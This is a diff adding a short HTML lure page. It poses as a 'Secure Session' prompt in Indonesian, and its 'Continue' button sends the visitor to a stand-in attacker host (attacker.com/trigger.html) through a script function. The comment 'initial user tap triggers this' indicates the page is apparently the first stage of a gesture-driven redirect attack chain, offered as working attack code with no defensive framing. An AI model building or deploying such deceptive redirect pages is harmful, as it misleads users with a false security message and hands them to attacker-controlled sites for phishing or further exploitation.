@@ -1,0 +1,23 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Gesture Entry</title>
+  <script>
+    // Simulate gesture (initial user tap triggers this)
+    function startChain() {
+      location.replace("https://attacker.com/trigger.html");
+    }
+  </script>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+    button { padding: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <h1>🔐 Secure Session</h1>
+  <p>Klik untuk memulai sesi aman Anda</p>
+  <button onclick="startChain()">Lanjutkan</button>
+</body>
+</html>
